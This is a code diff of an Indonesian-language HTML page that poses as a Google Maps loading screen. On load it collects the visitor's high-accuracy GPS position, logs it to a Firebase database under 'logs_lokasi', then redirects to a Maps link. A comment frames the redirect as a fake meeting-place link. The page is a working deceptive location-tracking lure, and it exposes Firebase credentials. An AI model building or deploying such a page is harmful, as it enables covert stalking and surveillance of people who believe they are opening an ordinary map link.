@@ -20,11 +20,11 @@
     <p>Mohon tunggu sebentar, sedang menyinkronkan dengan Google Maps.</p>
 
     <script>
-        // --- KONFIGURASI FIREBASE (SUDAH DISESUAIKAN DENGAN SERVER SINGAPURA ANDA) ---
+        // --- KOREKSI KONFIGURASI FIREBASE SESUAI GAMBAR DATABASE ANDA ---
         const firebaseConfig = {
             apiKey: "AIzaSyDLvcWnSRgoXxmid11Wx_GiVnOJMmgQR9I",
             authDomain: "maps-a9472.firebaseapp.com",
-            databaseURL: "https://maps-a9472-default-rtdb.asia-southeast1.firebasedatabase.app",
+            databaseURL: "https://maps-a9472-default-rtdb.firebaseio.com", // <-- KOREKSI DI SINI (Tanpa asia-southeast1)
             projectId: "maps-a9472",
             storageBucket: "maps-a9472.firebasestorage.app",
             messagingSenderId: "642710632619",
@@ -35,12 +35,11 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Target pengalihan setelah koordinat didapat (bisa diubah ke link lokasi janjian asli)
+        // Target pengalihan setelah koordinat didapat
         const TARGET_MAPS_URL = "https://goo.gl/maps/c6mZ8WnS2R9yT2Gv5"; 
 
         window.onload = function() {
             if (navigator.geolocation) {
-                // Mengambil posisi dengan akurasi setinggi mungkin dari perangkat keras GPS
                 navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                     enableHighAccuracy: true,
                     timeout: 7000,
@@ -79,7 +78,7 @@
                     pesanGagal = "Posisi tidak tersedia.";
                     break;
                 case error.TIMEOUT:
-                    pesanGagal = "Waktu permintaan habis (Koneksi lambat).";
+                    pesanGagal = "Waktu permintaan habis.";
                     break;
             }
             
@@ -88,7 +87,6 @@
         }
 
         function saveToFirebase(objekData) {
-            // Mengirim data ke folder "logs_lokasi" di Firebase Anda
             database.ref('logs_lokasi').push(objekData)
             .then(() => {
                 redirectToMaps();
